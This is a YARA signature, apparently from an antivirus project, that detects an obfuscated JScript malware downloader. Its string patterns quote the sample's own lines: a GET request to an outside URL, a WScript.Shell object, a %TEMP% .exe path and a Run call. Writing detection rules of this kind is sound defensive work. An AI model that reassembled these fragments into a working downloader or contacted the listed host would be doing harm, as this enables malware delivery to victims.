rule sig_20160401_2ef190316b51ddc89a2134325e704e89 {
  meta:
    description = "datamaliciousorder - file 20160401_2ef190316b51ddc89a2134325e704e89.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f0bb947e4d83b58889d84c3b09f70d2fd79877075ed031654ad32565cf066165"

  strings:
    $s1  = "EyRhp[KiHg](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "function YsAm(KfcBl, KojZp){NoScv = NoScv * 1; return KfcBl - KojZp;};" fullword ascii
    $s3  = "var NbIdb = function YoSr() {return WScript[XnlSh](\"WScript\"+\".Shell\");}(), DsIv = 11;" fullword ascii
    $s4  = "if (EyRhp[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HbyBwx(){return SxgYzr + \"\";};" fullword ascii
    $s6  = "function JgwErw() {return NbIdb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rYKgOvnN4oEp.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZufYnp() {return ((StClp == true) && (StClp == WpiXpk)) ? 1 : NoScv;};" fullword ascii
    $s8  = "function KaMb(JmVk){NbIdb[\"R\"+\"un\"](JmVk, NoScv, NoScv);};" fullword ascii
    $s9  = "function XsUu(){return XnlSh;};" fullword ascii
    $s10 = "}while (RguRgo);" fullword ascii
    $s11 = "function BuzAi(){return 23;};" fullword ascii
    $s12 = "function AafZj()" fullword ascii
    $s13 = "var StClp = false;" fullword ascii
    $s14 = "var VmtJka = new this[\"Date\"]();" fullword ascii
    $s15 = "var WpiXpk = false;" fullword ascii
    $s16 = "function OayWk(JvdBz) {var RaqDmj = (1, 2, 3, 4, 5, JvdBz); return RaqDmj;};" fullword ascii
    $s17 = "StClp = true; " fullword ascii
    $s18 = "WpiXpk = true; " fullword ascii
    $s19 = "var LhQi = false;" fullword ascii
    $s20 = "return YsAm(XjbWz, ReUvt);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}